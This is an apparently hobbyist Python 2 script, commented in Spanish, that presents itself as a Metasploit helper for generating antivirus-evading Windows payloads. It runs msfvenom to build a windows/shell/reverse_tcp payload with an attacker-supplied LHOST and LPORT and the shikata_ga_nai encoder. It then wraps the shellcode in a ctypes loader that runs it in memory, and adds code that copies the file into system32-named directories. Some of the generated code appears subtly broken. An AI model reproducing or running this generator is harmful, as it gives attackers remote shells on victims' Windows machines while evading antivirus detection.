from sys import argv
from ctypes import *
from subprocess import call
import os
import random
import shutil
import time
import subprocess 
print '=====Creado por JACOBO CANOVAS GARCIA correo jc-canovas@hotmail.com======  '
time.sleep(5.5) #aqui esperamos
print 'o========================================================================== o '
print 'o             ____       _          ____  _                                 o'
print 'o            / ___| __ _| |_ ___   | __ )| | __ _ _ __   ___ ___            o'
print "o           | |  _ / _` | __/ _ \  |  _ \| |/ _` | '_ \ / __/ _ \           o"
print 'o           | |_| | (_| | || (_) | | |_) | | (_| | | | | (_| (_) |          o'
print 'o            \____|\__,_|\__\___/  |____/|_|\__,_|_| |_|\___\___/           o'                                                                 
print 'o               ____                               _                        o'
print 'o              / ___| ___ _ __   ___ _ __ __ _  __| | ___  _ __             o'
print "o             | |  _ / _ \ '_ \ / _ \ '__/ _` |/ _` |/ _ \| '__|            o"
print 'o             | |_| |  __/ | | |  __/ | | (_| | (_| | (_) | |               o'
print 'o              \____|\___|_| |_|\___|_|  \__,_|\__,_|\___/|_|               o'
print 'o                       __  __             _                                o'
print 'o                      |  \/  | __ _  __ _(o) ___ ___                       o'
print 'o                      | |\/| |/ _` |/ _` | |/ __/ _ \                      o'
print 'o                      | |  | | (_| | (_| | | (_| (_) |                     o'
print 'o                      |_|  |_|\__,_|\__, |_|\___\___/                      o'
print 'o                                    |___/                                  o'
print 'o                                                                           o'
print 'o Es una herrramienta auxiliar para metasploit con la que se sonsigue crear o'
print 'o                un payload windows meterpreter reverse tcp                 o'
print 'o                    capaz de eludir cualquier antivirus                    o '
print 'o===========================================================================o  '
print("Espero unos segundos para que puedas leer el texto")
time.sleep(5.5) #aqui esperamos   
print("Se creara una carpeta llamada recoger y dentro un archivo llamado shellcode.py")
time.sleep(5.5) #aqui esperamos
os.system("mkdir recoger") #aqui creamos una carpeta
os.chdir("recoger")
directorio_actual = os.getcwd()
arquictetura = raw_input("Selecione una arquictetura escribir x86 o x64 ====>  ")
ip_v4 = raw_input("Escriba la ip_v4 de la maquina atacante ejemplo LHOST=192.168.0.102 ====>  ")
puerto = raw_input("Escriba un puerto ejemplo LPORT=1666 ====>  ")
shikata = raw_input("Selecione una encoder escribir x86/shikata_ga_nai o x64/shikata_ga_nai ====>  ")
lista = ["msfvenom" ,"-a" ,"x86" ,"--platform windows" ,"-p" ,"windows/shell/reverse_tcp" ,"LHOST=192.168.0.102" ,"LPORT=1666" ,"-b" ,"-e" ,"x86/shikata_ga_nai" ,"-f" ,"python" ,"-o" ,"/root/Escritorio/recoger/"] #aqui creamos una lista mutable
lista[2] = arquictetura
lista[6] = ip_v4
lista[7] = puerto
lista[10] = shikata
lista[14] = directorio_actual+"/shellcode.py"
lista2 = lista[0:15] 
msfvenom = " ".join(lista2)
proc = subprocess.Popen([msfvenom] , shell=True)
time.sleep(15.5) #aqui esperamos
os.rename( "shellcode.py", "shellcode.txt" ) #aqui cambiamos la extension delarchivo 
f = open("shellcode.txt",'r')    #aqui abrimos el fichero con permisos de lectura
chain = f.read()    #guardamos su contenido en una variable
chain = chain.replace("buf += ","")    #aqui borramos una palabra
f.close()    #aqui cerramos el fichero
otro = open("shellcode.txt",'w')    #abrimos el fichero con permisos de escritura
otro.write(chain)    #escribimos borrando la palabra
otro.close()
outfile = open('shellcode.txt', 'r+') #aqui escribimos al pricio del archivo 
outfile.write('shellcod=("')
outfile.close() 
outfile = open('shellcode.txt', 'a') #aqui escribimos al final del archivo 
outfile.write('memoria = create_string_buffer(shellcod, len(shellcod))\n' #aqui escribimos lineas al final del archivo
 'shell = cast(memoria, CFUNCTYPE(c_void_p)\n' 'shell()\n')
outfile.close()
def creartxt():
    archi=open('datos.txt','w')
    archi.close()
def grabartxt():
    archi=open('datos.txt','a')
    archi.write('from sys import argv\n')
    archi.write('from ctypes import *\n')
    archi.write('import os\n')
    archi.write('import random\n')
    archi.write('import shutil\n')
    archi.write('from time import *\n')
    archi.write('from os import walk\n')
    archi.write('for (path, ficheros, archivos) in walk("."): \n')
    archi.write('    limon = random.choice("ficheros")\n')
    archi.write('limon = limon\n')
    archi.write('numero = random.randrange(20)\n')
    archi.write('script = argv\n')
    archi.write('name = str(script[0])\n')
    archi.write('for i in range(0,10):\n')
    archi.write('  directorio = "C:\WINDOWS\system32"+str(i)\n')
    archi.write('  os.system("mkdir "+ limon)\n')
    archi.write('  shutil.copy2(name, directorio)\n')
    archi.close()

creartxt()
grabartxt()
linea = ""
archi=open('shellcode.txt','r')
lineas=archi.readlines()
for li in lineas:
    li = linea
archi.close()
inp = open("shellcode.txt","r")
outp = open("datos.txt","a")
for linea in inp.readlines():
    outp.write(linea)
inp.close()
outp.close()
os.remove('shellcode.txt')
os.rename( "datos.txt", "shellcode.py" ) #aqui cambiamos la extension delarchivo 
infile = open("shellcode.py", 'r') # Leemos el contenido para comprobar que ha sobreescrito el contenido.
call('clear')
print('>>> ///////////////////Imprimiendo el resultado en pantalla\\\\\\\\\\\\\\\\\\\\\\\<<<.')
time.sleep(5.5)
print(infile.read())
infile.close() # Cerramos el fichero.



